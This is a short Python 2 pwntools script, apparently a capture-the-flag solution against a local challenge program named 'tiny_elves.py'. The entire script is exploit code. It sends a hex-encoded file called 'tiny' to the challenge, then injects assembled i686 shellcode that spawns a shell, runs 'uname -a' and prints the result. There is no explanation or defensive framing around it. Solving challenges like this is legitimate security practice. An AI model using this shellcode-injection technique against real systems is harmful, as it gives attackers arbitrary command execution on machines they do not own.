from pwn import *
import time

context.arch = 'i686'

p = process('./tiny_elves.py')

p.sendline(enhex(open('tiny').read()))
#sleep(1)
pause()

p.sendline(asm(shellcraft.sh()))
p.sendline('uname -a; exit')
print p.readall()
#p.interactive()
